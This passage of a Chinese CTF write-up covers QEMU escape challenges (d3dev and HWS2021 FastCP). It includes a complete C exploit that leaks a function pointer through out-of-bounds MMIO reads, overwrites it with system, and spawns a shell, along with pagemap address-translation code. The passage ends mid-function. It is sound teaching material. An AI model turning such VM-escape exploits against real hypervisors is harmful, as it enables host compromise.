<p>从上面数据结构中，可知<code>block</code>的长度为<code>0x100</code>，而我们这里传入的<code>addr</code>并没有检查范围，所以可以超过<code>0x100</code>，从而发生越界读取。而这里越界之后，可以读取<code>key</code>和<code>rand_r</code>的值。</p>
<p>接着看<code>d3dev_write</code>:该函数主要是将传入的<code>val</code>赋值给<code>opaque-&gt;blocks[offset]</code>。如果是奇数次，则直接赋值。如果是偶数次则先加密再赋值。这里也没有对<code>addr</code>进行范围检查，可以越界写。</p>
<p>之后<code>d3dev_pmio_read()</code></p>
<p><img src="https://pic1.imgdb.cn/item/6357d1ad16f2c2beb1c9063b.png" /></p>
<p><code>d3dev_pmio_read</code>基本功能就是，通过输入不同的<code>addr</code>，会进入不同<code>switch-case</code>。这里就会将<code>opaque-&gt;key</code>的四个值进行返回。</p>
<p><code>d3dev_pmio_write</code>会去调用<code>rand_r</code>函数指针，这个指针存储的是<code>rand</code>函数地址。</p>
<p><img src="https://pic1.imgdb.cn/item/6357d23b16f2c2beb1c9c6f4.png" /></p>
<h3 id="漏洞利用">2. 漏洞利用</h3>
<p>利用mmio_read的越界读获得key值和rand_r的值，其中rand_r保存的rand函数的地址，实现泄露地址，我们通过越界读泄漏该地址，那么就可以得到<code>qemu</code>的基址。</p>
<p>得到了<code>qemu</code>基址后，我们就可以计算得到<code>system</code>函数的地址。</p>
<p>然后通过越界写，修改<code>rand_r</code>存储的函数指针为<code>system</code>。然后去触发<code>system</code>函数。</p>
<p>在<code>d3dev_mmio_write</code>函数中的越界写可以直接修改结构体中的数据，两个分支一个可以直接覆写4字节，另一个经过加密后可以覆写8字节；<code>d3dev_mmio_read</code>读取的数据要经过随机数key和key1进行加密，可以通过越界写将两处key内存覆盖为0或在<code>d3dev_pmio_write</code>函数中将两处key都设置为0</p>
<p>这里想实现<code>getshell</code>，可以去执行<code>rand_r</code>函数，并设置参数为<code>sh</code>。</p>
<p>查看mmio和pmio基地址的方法：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb5-1" title="1"><span class="ex">/sys/devices</span>/pci0000:<span class="ex">00</span>/0000:<span class="ex">00</span>:03.0 <span class="co"># cat resource</span></a>
<a class="sourceLine" id="cb5-2" title="2"><span class="ex">0x00000000febf1000</span> 0x00000000febf17ff 0x0000000000040200</a>
<a class="sourceLine" id="cb5-3" title="3"><span class="ex">0x000000000000c040</span> 0x000000000000c05f 0x0000000000040101</a></code></pre></div>
<p>其中0x00000000febf1000就是mmio地址；0x000000000000c040就是pmio地址</p>
<h3 id="exploit">3. Exploit</h3>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1"><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb6-2" title="2"><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb6-3" title="3"><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb6-4" title="4"><span class="pp">#include</span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb6-5" title="5"><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb6-6" title="6"><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb6-7" title="7"></a>
<a class="sourceLine" id="cb6-8" title="8"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb6-9" title="9"></a>
<a class="sourceLine" id="cb6-10" title="10"><span class="dt">void</span> Err(<span class="dt">char</span> * err){</a>
<a class="sourceLine" id="cb6-11" title="11">    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,err);</a>
<a class="sourceLine" id="cb6-12" title="12">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb6-13" title="13">}</a>
<a class="sourceLine" id="cb6-14" title="14"></a>
<a class="sourceLine" id="cb6-15" title="15"><span class="dt">void</span> init_pmio(){</a>
<a class="sourceLine" id="cb6-16" title="16">    iopl(<span class="dv">3</span>); <span class="co">// 0x3ff 以上端口全部开启访问</span></a>
<a class="sourceLine" id="cb6-17" title="17">}</a>
<a class="sourceLine" id="cb6-18" title="18"></a>
<a class="sourceLine" id="cb6-19" title="19"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb6-20" title="20">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,O_RDWR|O_SYNC);</a>
<a class="sourceLine" id="cb6-21" title="21">    mmio_mem = mmap(<span class="dv">0</span>,<span class="bn">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-22" title="22">}</a>
<a class="sourceLine" id="cb6-23" title="23"></a>
<a class="sourceLine" id="cb6-24" title="24"><span class="dt">void</span> mmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb6-25" title="25">    *(<span class="dt">uint32_t</span>*)(mmio_mem+addr) = value;</a>
<a class="sourceLine" id="cb6-26" title="26">}</a>
<a class="sourceLine" id="cb6-27" title="27"></a>
<a class="sourceLine" id="cb6-28" title="28"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb6-29" title="29">    <span class="cf">return</span> *(<span class="dt">uint64_t</span>*)(mmio_mem+addr); </a>
<a class="sourceLine" id="cb6-30" title="30">}</a>
<a class="sourceLine" id="cb6-31" title="31"></a>
<a class="sourceLine" id="cb6-32" title="32"><span class="dt">uint32_t</span> pmio_base = <span class="bn">0xc040</span>;</a>
<a class="sourceLine" id="cb6-33" title="33"></a>
<a class="sourceLine" id="cb6-34" title="34"><span class="dt">void</span> pmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb6-35" title="35">    outl(value,pmio_base+addr);</a>
<a class="sourceLine" id="cb6-36" title="36">}</a>
<a class="sourceLine" id="cb6-37" title="37"></a>
<a class="sourceLine" id="cb6-38" title="38"><span class="dt">uint64_t</span> pmio_read(<span class="dt">uint32_t</span> addr){</a>
<a class="sourceLine" id="cb6-39" title="39">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)inl(pmio_base+addr);</a>
<a class="sourceLine" id="cb6-40" title="40">}</a>
<a class="sourceLine" id="cb6-41" title="41"></a>
<a class="sourceLine" id="cb6-42" title="42"><span class="dt">uint64_t</span> encode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</a>
<a class="sourceLine" id="cb6-43" title="43"></a>
<a class="sourceLine" id="cb6-44" title="44">    <span class="dt">uint32_t</span> addr = <span class="bn">0xC6EF3720</span>;</a>
<a class="sourceLine" id="cb6-45" title="45"></a>
<a class="sourceLine" id="cb6-46" title="46">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</a>
<a class="sourceLine" id="cb6-47" title="47">        high = high - ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</a>
<a class="sourceLine" id="cb6-48" title="48">        low = low - (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</a>
<a class="sourceLine" id="cb6-49" title="49">        addr += <span class="bn">0x61C88647</span>;</a>
<a class="sourceLine" id="cb6-50" title="50">    }</a>
<a class="sourceLine" id="cb6-51" title="51"></a>
<a class="sourceLine" id="cb6-52" title="52">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</a>
<a class="sourceLine" id="cb6-53" title="53">}</a>
<a class="sourceLine" id="cb6-54" title="54"></a>
<a class="sourceLine" id="cb6-55" title="55"><span class="dt">uint64_t</span> decode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</a>
<a class="sourceLine" id="cb6-56" title="56"></a>
<a class="sourceLine" id="cb6-57" title="57">    <span class="dt">uint32_t</span> addr = <span class="bn">0x0</span>;</a>
<a class="sourceLine" id="cb6-58" title="58"></a>
<a class="sourceLine" id="cb6-59" title="59">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</a>
<a class="sourceLine" id="cb6-60" title="60">        addr -= <span class="bn">0x61C88647</span>;</a>
<a class="sourceLine" id="cb6-61" title="61">        low += (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</a>
<a class="sourceLine" id="cb6-62" title="62">        high += ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</a>
<a class="sourceLine" id="cb6-63" title="63">    }</a>
<a class="sourceLine" id="cb6-64" title="64"></a>
<a class="sourceLine" id="cb6-65" title="65">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</a>
<a class="sourceLine" id="cb6-66" title="66">}</a>
<a class="sourceLine" id="cb6-67" title="67"></a>
<a class="sourceLine" id="cb6-68" title="68"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb6-69" title="69">    printf(<span class="st">&quot;init pci and mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-70" title="70">    init_pmio();</a>
<a class="sourceLine" id="cb6-71" title="71">    init_mmio();</a>
<a class="sourceLine" id="cb6-72" title="72"></a>
<a class="sourceLine" id="cb6-73" title="73">    printf(<span class="st">&quot;set seek = 0x100</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-74" title="74">    pmio_write(<span class="bn">0x8</span>,<span class="bn">0x100</span>);</a>
<a class="sourceLine" id="cb6-75" title="75">    printf(<span class="st">&quot;set key = 0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-76" title="76">    pmio_write(<span class="bn">0x4</span>,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-77" title="77"></a>
<a class="sourceLine" id="cb6-78" title="78"></a>
<a class="sourceLine" id="cb6-79" title="79">    printf(<span class="st">&quot;oob read rand_r</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-80" title="80">    <span class="dt">uint64_t</span> value = mmio_read(<span class="dv">3</span>*<span class="dv">8</span>);</a>
<a class="sourceLine" id="cb6-81" title="81">    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>,value);</a>
<a class="sourceLine" id="cb6-82" title="82"></a>
<a class="sourceLine" id="cb6-83" title="83">    <span class="dt">uint64_t</span> rand_r = decode(value&gt;&gt;<span class="dv">32</span>, value&amp;<span class="bn">0xffffffff</span>);</a>
<a class="sourceLine" id="cb6-84" title="84">    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, rand_r);</a>
<a class="sourceLine" id="cb6-85" title="85"></a>
<a class="sourceLine" id="cb6-86" title="86">    <span class="dt">uint64_t</span> system_addr = rand_r+<span class="bn">0xa560</span>;</a>
<a class="sourceLine" id="cb6-87" title="87">    printf(<span class="st">&quot;system_addr ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_addr);</a>
<a class="sourceLine" id="cb6-88" title="88"></a>
<a class="sourceLine" id="cb6-89" title="89">    <span class="dt">uint64_t</span> encode_system = encode(system_addr&gt;&gt;<span class="dv">32</span>, system_addr&amp;<span class="bn">0xffffffff</span>);</a>
<a class="sourceLine" id="cb6-90" title="90">    printf(<span class="st">&quot;encode_system ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, encode_system);</a>
<a class="sourceLine" id="cb6-91" title="91"></a>
<a class="sourceLine" id="cb6-92" title="92">    <span class="dt">uint32_t</span> es_low  = encode_system % <span class="bn">0x100000000</span>;</a>
<a class="sourceLine" id="cb6-93" title="93">    <span class="dt">uint32_t</span> es_high = encode_system / <span class="bn">0x100000000</span>;</a>
<a class="sourceLine" id="cb6-94" title="94"></a>
<a class="sourceLine" id="cb6-95" title="95">    printf(<span class="st">&quot;oob write</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-96" title="96">    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_low);</a>
<a class="sourceLine" id="cb6-97" title="97">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb6-98" title="98">    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_high);</a>
<a class="sourceLine" id="cb6-99" title="99"></a>
<a class="sourceLine" id="cb6-100" title="100">    printf(<span class="st">&quot;set seek=0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-101" title="101">    pmio_write(<span class="bn">0x8</span>, <span class="bn">0x0</span>);</a>
<a class="sourceLine" id="cb6-102" title="102"></a>
<a class="sourceLine" id="cb6-103" title="103"></a>
<a class="sourceLine" id="cb6-104" title="104">    pmio_write(<span class="bn">0x1c</span>,<span class="bn">0x6873</span>); <span class="co">// 0x6873 == &quot;sh&quot;</span></a>
<a class="sourceLine" id="cb6-105" title="105"></a>
<a class="sourceLine" id="cb6-106" title="106">}</a></code></pre></div>
<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb7-1" title="1"><span class="co">#!bash</span></a>
<a class="sourceLine" id="cb7-2" title="2"><span class="fu">gcc</span> expliot.c -o expliot --static <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-3" title="3"><span class="fu">chmod</span> +x expliot <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-4" title="4"><span class="fu">cp</span> ./expliot ./cpio-root/expliot <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-5" title="5"><span class="bu">cd</span> ./cpio-root <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-6" title="6"><span class="fu">find</span> . <span class="kw">|</span> <span class="fu">cpio</span> -o --format=newc <span class="op">&gt;</span> ../rootfs.img</a></code></pre></div>
<h2 id="x02-hws2021-fastcp">0x02 HWS2021 FastCP</h2>
<h3 id="分析-1">1. 分析</h3>
<pre class="bas"><code>#!/bin/sh

./qemu-system-x86_64 -initrd ./rootfs.img -nographic -kernel ./vmlinuz-5.0.5-generic -append &quot;priority=low console=ttyS0&quot; -monitor /dev/null --device FastCP
</code></pre>
<p>可以看到有设备FastCP</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb9-1" title="1"><span class="dt">void</span> __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)</a>
<a class="sourceLine" id="cb9-2" title="2">{</a>
<a class="sourceLine" id="cb9-3" title="3">  Object_0 *v2; <span class="co">// rbp</span></a>
<a class="sourceLine" id="cb9-4" title="4"></a>
<a class="sourceLine" id="cb9-5" title="5">  v2 = object_dynamic_cast_assert(</a>
<a class="sourceLine" id="cb9-6" title="6">         &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb9-7" title="7">         <span class="st">&quot;FastCP&quot;</span>,</a>
<a class="sourceLine" id="cb9-8" title="8">         <span class="st">&quot;/root/source/qemu/hw/misc/fastcp.c&quot;</span>,</a>
<a class="sourceLine" id="cb9-9" title="9">         <span class="dv">258</span>,</a>
<a class="sourceLine" id="cb9-10" title="10">         <span class="st">&quot;pci_FastCP_realize&quot;</span>);</a>
<a class="sourceLine" id="cb9-11" title="11">  pdev-&gt;config[<span class="dv">61</span>] = <span class="dv">1</span>;</a>
<a class="sourceLine" id="cb9-12" title="12">  <span class="cf">if</span> ( !msi_init(pdev, <span class="dv">0</span>, <span class="dv">1</span><span class="bu">u</span>, <span class="dv">1</span>, <span class="dv">0</span>, errp) )</a>
<a class="sourceLine" id="cb9-13" title="13">  {</a>
<a class="sourceLine" id="cb9-14" title="14">    timer_init_full(</a>
<a class="sourceLine" id="cb9-15" title="15">      (QEMUTimer_0 *)&amp;v2[<span class="dv">166</span>].properties,</a>
<a class="sourceLine" id="cb9-16" title="16">      <span class="dv">0</span><span class="bu">LL</span>,</a>
<a class="sourceLine" id="cb9-17" title="17">      QEMU_CLOCK_VIRTUAL,</a>
<a class="sourceLine" id="cb9-18" title="18">      (<span class="dt">int</span>)&amp;stru_F4240,</a>
<a class="sourceLine" id="cb9-19" title="19">      <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb9-20" title="20">      fastcp_cp_timer,</a>
<a class="sourceLine" id="cb9-21" title="21">      v2);</a>
<a class="sourceLine" id="cb9-22" title="22">    memory_region_init_io(</a>
<a class="sourceLine" id="cb9-23" title="23">      (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free,</a>
<a class="sourceLine" id="cb9-24" title="24">      v2,</a>
<a class="sourceLine" id="cb9-25" title="25">      &amp;fastcp_mmio_ops,</a>
<a class="sourceLine" id="cb9-26" title="26">      v2,</a>
<a class="sourceLine" id="cb9-27" title="27">      <span class="st">&quot;fastcp-mmio&quot;</span>,</a>
<a class="sourceLine" id="cb9-28" title="28">      (<span class="dt">uint64_t</span>)&amp;stru_100000);</a>
<a class="sourceLine" id="cb9-29" title="29">    pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free);</a>
<a class="sourceLine" id="cb9-30" title="30">    HIDWORD(v2[<span class="dv">63</span>].parent) = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb9-31" title="31">  }</a>
<a class="sourceLine" id="cb9-32" title="32">}</a></code></pre></div>
<p>主要有mmio操作和cp_timer操作</p>
<p>接下来分析mmio_read操作</p>
<p><img src="https://pic1.imgdb.cn/item/6358f67116f2c2beb1334b2c.png" /></p>
<p>可以看到如果size==8 ，根据addr的不同返回不同的数据，</p>
<ul>
<li>功能0x08 返回opaque-&gt;cp_state.CP_list_src</li>
<li>功能0x10 返回opaque-&gt;cp_state.CP_list_cnt</li>
<li>功能0x18 返回opaque-&gt;cp_state.cmd3</li>
</ul>
<p>其中为了控制size==0需要设置addr为<code>uint64_t</code>类型</p>
<p>接下来分析mmio_write</p>
<p><img src="https://pic1.imgdb.cn/item/6358f82716f2c2beb136cffd.png" /></p>
<p>当addr==24的时候不仅设置cmd，还触发时钟函数<code>timer_mod</code></p>
<p>之后分析<code>fastcp_cp_timer</code>函数</p>
<p><img src="https://pic1.imgdb.cn/item/6358fa8116f2c2beb13b7715.png" /></p>
<p>timer函数根据传入的参数cmd来选择执行的分支</p>
<p><img src="https://pic1.imgdb.cn/item/6358fbce16f2c2beb13db48c.png" /></p>
<p>其中<code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)</code></p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</a>
<a class="sourceLine" id="cb10-2" title="2">                            hwaddr len, <span class="dt">bool</span> is_write);</a>
<a class="sourceLine" id="cb10-3" title="3"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</a>
<a class="sourceLine" id="cb10-4" title="4">                                            <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb10-5" title="5">{</a>
<a class="sourceLine" id="cb10-6" title="6">    cpu_physical_memory_rw(addr, buf, len, false);</a>
<a class="sourceLine" id="cb10-7" title="7">}</a>
<a class="sourceLine" id="cb10-8" title="8"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</a>
<a class="sourceLine" id="cb10-9" title="9">                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb10-10" title="10">{</a>
<a class="sourceLine" id="cb10-11" title="11">    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</a>
<a class="sourceLine" id="cb10-12" title="12">}</a></code></pre></div>
<p>如果<code>opaque-&gt;cp_state.CP_list_cnt</code>大小大于<code>0x10</code>，则会根据<code>cp_state.CP_list_cnt</code>的大小循环从<code>opaque-&gt;cp_state.CP_list_src</code>读取结构体到<code>cp_info</code>，然后依次将<code>CP_src</code>中的数据写入到<code>CP_buffer</code>，然后从<code>CP_buffer</code>中读取数据到<code>CP_dst</code>，长度由<code>CP_cnt</code>指定。</p>
<p>漏洞很明显位于在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在 FastCPState 的结构中（结构如下）</p>
<pre><code>00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
00000000 pdev PCIDevice_0 ?
000008F0 mmio MemoryRegion_0 ?
000009E0 cp_state CP_state ?
000009F8 handling db ?
000009F9 db ? ; undefined
000009FA db ? ; undefined
000009FB db ? ; undefined
000009FC irq_status dd ?
00000A00 CP_buffer db 4096 dup(?)
00001A00 cp_timer QEMUTimer_0 ?
00001A30 FastCPState ends</code></pre>
<p>可以看出CP_buffer只有0x1000字节。</p>
<h3 id="物理地址转换">2. 物理地址转换</h3>
<p>通过<code>pagemap</code>将虚拟机中的虚拟地址转换为物理地址。</p>
<p>根据内核文档可知，每个虚拟页在<code>/proc/pid/pagemap</code>中对应一项长度为<code>64 bits</code>的数据，其中<code>Bit 63</code>为<code>page present</code>，表示物理内存页是否已存在；若物理页已存在，则<code>Bits 0-54</code>表示物理页号，此外，需要<code>root</code>权限的进程才能读取<code>/proc/pid/pagemap</code>中的内容。</p>
<pre><code>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow
userspace programs to examine the page tables and related information by
reading files in /proc.

There are four components to pagemap:

*/proc/pid/pagemap. This file lets a userspace process find out which
physical frame each virtual page is mapped to. It contains one 64-bit
value for each virtual page, containing the following data (from
fs/proc/task_mmu.c, above pagemap_read):

* Bits 0-54 page frame number (PFN) if present
* Bits 0-4 swap type if swapped
* Bits 5-54 swap offset if swapped
* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
* Bit 56 page exclusively mapped (since 4.2)
* Bits 57-60 zero
* Bit 61 page is file-page or shared-anon (since 3.5)
* Bit 62 page swapped
* Bit 63 page present

Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.
In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from
4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.
Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</code></pre>
<p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p>
<p>2、 读取长度为<code>64bits</code>的数据项</p>
<p>3、 根据<code>Bit 63</code> 判断物理内存页是否存在</p>
<p>4、 若物理内存页已存在，则取<code>bits 0-54</code>作为物理页号</p>
<p>5、 计算出物理页起始地址加上页内偏移即得到物理地址，<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p>
<p>对应代码如下：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb13-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb13-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb13-3" title="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb13-4" title="4"><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></a>
<a class="sourceLine" id="cb13-5" title="5"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb13-6" title="6"><span class="pp">#include </span><span class="im">&lt;inttypes.h&gt;</span></a>
<a class="sourceLine" id="cb13-7" title="7"><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb13-8" title="8"><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></a>
<a class="sourceLine" id="cb13-9" title="9"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb13-10" title="10"><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span><span class="pp">   </span></a>
<a class="sourceLine" id="cb13-11" title="11"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb13-12" title="12"></a>
<a class="sourceLine" id="cb13-13" title="13"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb13-14" title="14">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb13-15" title="15"></a>
<a class="sourceLine" id="cb13-16" title="16">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb13-17" title="17">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb13-18" title="18">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb13-19" title="19">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-20" title="20">    }</a>
<a class="sourceLine" id="cb13-21" title="21"></a>
<a class="sourceLine" id="cb13-22" title="22">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb13-23" title="23">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
<a class="sourceLine" id="cb13-24" title="24"></a>
<a class="sourceLine" id="cb13-25" title="25">    <span class="cf">if</span>(lseek(fd,offset,SEEK_SET) &lt; <span class="dv">0</span>){</a>
<a class="sourceLine" id="cb13-26" title="26">        puts(<span class="st">&quot;lseek&quot;</span>);</a>
<a class="sourceLine" id="cb13-27" title="27">        close(fd);</a>
<a class="sourceLine" id="cb13-28" title="28">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-29" title="29">    }</a>
<a class="sourceLine" id="cb13-30" title="30"></a>
<a class="sourceLine" id="cb13-31" title="31">    <span class="cf">if</span>(read(fd,&amp;data,<span class="dv">8</span>) != <span class="dv">8</span>){</a>
<a class="sourceLine" id="cb13-32" title="32">        puts(<span class="st">&quot;read&quot;</span>);</a>
<a class="sourceLine" id="cb13-33" title="33">        close(fd);</a>
<a class="sourceLine" id="cb13-34" title="34">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-35" title="35">    }</a>
<a class="sourceLine" id="cb13-36" title="36"></a>
<a class="sourceLine" id="cb13-37" title="37">    <span class="cf">if</span>(!(data &amp; (((<span class="dt">uint64_t</span>)<span class="dv">1</span> &lt;&lt; <span class="dv">63</span>)))){</a>
<a class="sourceLine" id="cb13-38" title="38">        puts(<span class="st">&quot;page&quot;</span>);</a>
<a class="sourceLine" id="cb13-39" title="39">        close(fd);</a>
<a class="sourceLine" id="cb13-40" title="40">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-41" title="41">    }</a>
<a class="sourceLine" id="cb13-42" title="42"></a>
<a class="sourceLine" id="cb13-43" title="43">    <span class="dt">size_t</span> pageframenum = data &amp; ((<span class="dv">1</span><span class="bu">ull</span> &lt;&lt; <span class="dv">55</span>) - <span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-44" title="44">    <span class="dt">size_t</span> phyaddr = pageframenum * pagesize + (<span class="dt">uintptr_t</span>)addr % pagesize;</a>
<a class="sourceLine" id="cb13-45" title="45"></a>
<a class="sourceLine" id="cb13-46" title="46">    close(fd);</a>
<a class="sourceLine" id="cb13-47" title="47"></a>
<a class="sourceLine" id="cb13-48" title="48">    <span class="cf">return</span> phyaddr;</a>
<a class="sourceLine" id="cb13-49" title="49">}</a>
<a class="sourceLine" id="cb13-50" title="50"></a>
<a class="sourceLine" id="cb13-51" title="51"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb13-52" title="52">    <span class="dt">char</span> *userbuf;</a>
<a class="sourceLine" id="cb13-53" title="53">    <span class="dt">uint64_t</span> userbuf_pa;</a>
<a class="sourceLine" id="cb13-54" title="54">    <span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb13-55" title="55"></a>
<a class="sourceLine" id="cb13-56" title="56">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</a>
<a class="sourceLine" id="cb13-57" title="57">    <span class="cf">if</span> (mmio_fd == -<span class="dv">1</span>){</a>
<a class="sourceLine" id="cb13-58" title="58">        perror(<span class="st">&quot;open mmio&quot;</span>);</a>
<a class="sourceLine" id="cb13-59" title="59">        exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb13-60" title="60">    }</a>
<a class="sourceLine" id="cb13-61" title="61"></a>
<a class="sourceLine" id="cb13-62" title="62">    mmio_mem = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="dv">0</span>);</a>
